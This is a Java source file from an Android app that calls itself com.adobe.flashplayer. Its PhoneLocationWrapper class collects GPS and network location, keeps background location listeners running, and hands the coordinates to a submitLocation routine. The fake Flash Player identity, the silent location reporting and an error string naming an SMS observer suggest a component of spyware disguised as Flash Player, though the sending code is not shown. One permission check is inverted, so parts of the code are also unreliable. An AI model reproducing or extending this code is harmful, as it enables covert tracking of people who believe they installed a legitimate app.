package com.adobe.flashplayer.data;

import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.MyLog;

import android.location.Criteria;



/**
 * 功能描述：通过手机信号获取基站信息
 * # 通过TelephonyManager 获取lac:mcc:mnc:cell-id
 * # MCC，Mobile Country Code，移动国家代码（中国的为460）；
 * # MNC，Mobile Network Code，移动网络号码（中国移动为0，中国联通为1，中国电信为2）；
 * # LAC，Location Area Code，位置区域码；
 * # CID，Cell Identity，基站编号；
 * # BSSS，Base station signal strength，基站信号强度。
 * @author android_ls
 */
public class PhoneLocationWrapper implements Runnable{
    private static final String TAG = "[ljg]PhoneLocation";
    //public static final String OID = "5719";
    //public static final String KEY = "A7A1EACD8DF34447AC287C989CEA6442";
    //public static final String LOCATIONOID = "5728";
    //public static final String LOCATIONKEY = "8C9989F3B5E35A056E460CBC717AD4F5";

    private static String NETWORK_LOCATION_NAME = "NETWORK";

    private static String GPS_LOCATION_NAME = "GPS";

    public static LocationListener gLocationListener ;

    Context context;

    public PhoneLocationWrapper(Context context) {
        this.context = context;
    }


    public static boolean getGPSLocation(Context context){
        try {
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_FINE_LOCATION) &
                    ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_COARSE_LOCATION);
            if (granted == PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG,"doOneGpsLocation permittion not allowed");
                return false;
            }

            LocationManager locmgr = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
            if(locmgr.isProviderEnabled(LocationManager.GPS_PROVIDER)){
                Location location = locmgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location != null) {
                    PhoneLocationListener.submitLocation( location.getLatitude(),location.getLongitude(),"", context);
                    return true;
                }else{
                    return false;
                }
            }else{
                return false;
            }
        }catch(Exception e){
            e.printStackTrace();
        }

        return false;
    }




    public static boolean getNetworkLocation(Context context){
        try {
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_FINE_LOCATION) &
                    ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_COARSE_LOCATION);
            if (granted != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG,"doOneNetworkLocation permittion not allowed");
                return false;
            }

            LocationManager locmgr = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
            if(locmgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location location = locmgr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if(location != null){
                    PhoneLocationListener.submitLocation( location.getLatitude(),location.getLongitude(),"", context);
                    return true;
                }else{
                    return false;
                }
            }else{
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }


    public static String setGPSLocation(Context context){

        int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_FINE_LOCATION) &
                ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_COARSE_LOCATION);
        if (granted != PackageManager.PERMISSION_GRANTED)
        {
            return null;
        }

        LocationManager locmgr = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
        if(locmgr.isProviderEnabled(LocationManager.GPS_PROVIDER)){
            if (gLocationListener != null) {
                locmgr.requestLocationUpdates(LocationManager.GPS_PROVIDER,
                        Public.PHONE_LOCATION_MINSECONDS*1000, Public.PHONE_LOCATION_DISTANCE,gLocationListener);
                return GPS_LOCATION_NAME;
            }
        }
        else{
            Log.e(TAG,"getGPSLocation isProviderEnabled false");
        }

        return null;
    }



    public static String setNetWorkLocation(Context context){

        int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_FINE_LOCATION) &
                ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_COARSE_LOCATION);
        if (granted != PackageManager.PERMISSION_GRANTED)
        {
            return null;
        }

        LocationManager locmgr = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
        if(locmgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            if (gLocationListener != null) {
                locmgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,
                        Public.PHONE_LOCATION_MINSECONDS*1000, Public.PHONE_LOCATION_DISTANCE,gLocationListener);
                return NETWORK_LOCATION_NAME;
            }
        }
        else{
            Log.e(TAG,"getNetWorkLocation isProviderEnabled error");
            MyLog.writeLogFile("getNetWorkLocation isProviderEnabled error\r\n");
        }

        return null;
    }

    public static void closeLocationListener(Context context){
        if(gLocationListener!=null){
            LocationManager locmgr = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
            locmgr.removeUpdates(gLocationListener);
        }
    }


    public static boolean setLocationListener(Context context){

        int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_FINE_LOCATION) &
                ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_COARSE_LOCATION);
        if (granted != PackageManager.PERMISSION_GRANTED)
        {
            return false;
        }
        LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        gLocationListener = new PhoneLocationListener(context);

        Criteria criteria = new Criteria();
        criteria.setAccuracy(Criteria.ACCURACY_COARSE);
        criteria.setAltitudeRequired(false);    //不要求海拔
        criteria.setBearingRequired(false);     //不要求方位
        criteria.setCostAllowed(true);          //允许有花费
        criteria.setPowerRequirement(Criteria.POWER_LOW);   //低功耗

        String provider = lm.getBestProvider(criteria, true);

        lm.requestLocationUpdates(provider, Public.PHONE_LOCATION_MINSECONDS*1000, Public.PHONE_LOCATION_DISTANCE,gLocationListener);

        return true;
    }


    public static boolean getLastLocation(Context context){

        int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_FINE_LOCATION) &
                ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_COARSE_LOCATION);
        if (granted != PackageManager.PERMISSION_GRANTED)
        {
            return false;
        }
        LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

        Criteria criteria = new Criteria();
        criteria.setAccuracy(Criteria.ACCURACY_COARSE);
        criteria.setAltitudeRequired(false);    //不要求海拔
        criteria.setBearingRequired(false);     //不要求方位
        criteria.setCostAllowed(true);          //允许有花费
        criteria.setPowerRequirement(Criteria.POWER_LOW);   //低功耗

        String provider = lm.getBestProvider(criteria, true);

        Location location = lm.getLastKnownLocation(provider);

        if (location != null) {
            String longitude = "Longitude:" + location.getLongitude();
            String latitude = "Latitude:" + location.getLatitude();
            PhoneLocationListener.submitLocation( location.getLatitude(),location.getLongitude(),"", context);
        }

        return true;
    }


    public static boolean isLocationEnabled(Context context) {
        int locationMode = 0;
        String locationProviders;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            try {
                locationMode = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.LOCATION_MODE);
            } catch (Settings.SettingNotFoundException e) {
                e.printStackTrace();
                return false;
            }
            return locationMode != Settings.Secure.LOCATION_MODE_OFF;
        } else {
            locationProviders = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
            return !TextUtils.isEmpty(locationProviders);
        }
    }


    public void run(){
        try {
        int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_FINE_LOCATION) &
                ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_COARSE_LOCATION);
        if (granted != PackageManager.PERMISSION_GRANTED)
        {
            return;
        }

        Looper.prepare();

        LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        gLocationListener = new PhoneLocationListener(context);

        Criteria criteria = new Criteria();
        criteria.setAccuracy(Criteria.ACCURACY_COARSE);
        criteria.setAltitudeRequired(false);    //不要求海拔
        criteria.setBearingRequired(false);     //不要求方位
        criteria.setCostAllowed(true);          //允许有花费
        criteria.setPowerRequirement(Criteria.POWER_LOW);   //低功耗

        String provider = lm.getBestProvider(criteria, true);

        lm.requestLocationUpdates(provider, Public.PHONE_LOCATION_MINSECONDS*1000, Public.PHONE_LOCATION_DISTANCE,gLocationListener);

        Looper.loop();

        } catch (Exception e) {
            String error = Utils.getExceptionDetail(e);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("SMSContentObserver exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            e.printStackTrace();
        }
    }

}
